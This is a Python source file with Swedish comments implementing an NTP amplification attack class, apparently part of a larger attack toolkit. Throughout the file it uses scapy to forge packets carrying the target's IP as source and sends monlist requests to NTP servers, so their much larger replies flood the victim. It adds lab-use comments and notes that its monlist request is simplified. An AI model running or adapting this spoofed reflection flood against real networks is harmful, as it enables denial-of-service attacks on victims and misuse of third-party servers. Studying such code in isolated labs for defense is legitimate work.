ntp_amplification_attack.py ====================
"""
NTP Amplification Attack
Utnyttjar NTP monlist-kommando för extrem amplification
"""
from scapy.all import IP, UDP, Raw
import time
from .base_attack import BaseAttack
from utils.network_utils import generate_random_port


class NTPAmplificationAttack(BaseAttack):
    """NTP Amplification - Extremt kraftfull amplification (206x)"""

    def get_attack_name(self):
        return "NTP Amplification"

    def execute(self, count=100, ntp_servers=None):
        """
        Kör NTP amplification attack
        ntp_servers: Lista med NTP-servrar (använd egna i labb!)
        """
        if ntp_servers is None:
            # Exempel NTP-servrar (dessa bör vara egna testservrar i verkligheten)
            ntp_servers = [
                "192.168.1.100",  # Ersätt med egen NTP-server i labbet
                "192.168.1.101"
            ]

        self.print_header("NTP Amplification Attack", port=123, count=count)

        print("[*] NTP Amplification utnyttjar 'monlist' kommando")
        print(f"[*] Använder {len(ntp_servers)} NTP-servrar")
        print("[*] Förväntad amplifikation: 206x (!!) - EXTREMT kraftfull")
        print("[!] VARNING: Fungerar bara mot äldre NTP-servrar med monlist aktiverat")

        self.start_time = time.time()
        self.packets_sent = 0

        # NTP monlist request (Mode 7, Request code 42)
        # Detta är en förenklad version - verklig monlist är mer komplex
        ntp_monlist = b'\x17\x00\x03\x2a' + b'\x00' * 4  # Simplified monlist request

        for i in range(count):
            ntp_server = ntp_servers[i % len(ntp_servers)]
            fake_sport = generate_random_port()

            # Source IP spoofad till target
            payload = ntp_monlist + f"[{self.custom_message}_NTP_{i + 1}]".encode()

            packet = IP(src=self.target_ip, dst=ntp_server) / \
                     UDP(sport=fake_sport, dport=123) / \
                     Raw(load=payload)

            self.send_packet(packet)

            if (i + 1) % 50 == 0:
                elapsed = time.time() - self.start_time
                pps = self.packets_sent / elapsed if elapsed > 0 else 0
                print(f"[+] NTP Amp: {i + 1}/{count} queries ({pps:.1f} pps)")
                print(f"    → NTP-servrar svarar till {self.target_ip} (206x amplifierat!)")

        self.log_attack("NTP_AMPLIFICATION",
                        f"{count} monlist queries, target: {self.target_ip}, servers: {ntp_servers}")
        self.print_summary()

        print("\n[!] OBS: Varje 8-byte query → 1648-byte respons (206x)")
        print("[!] Moderna NTP-servrar har monlist avaktiverat")


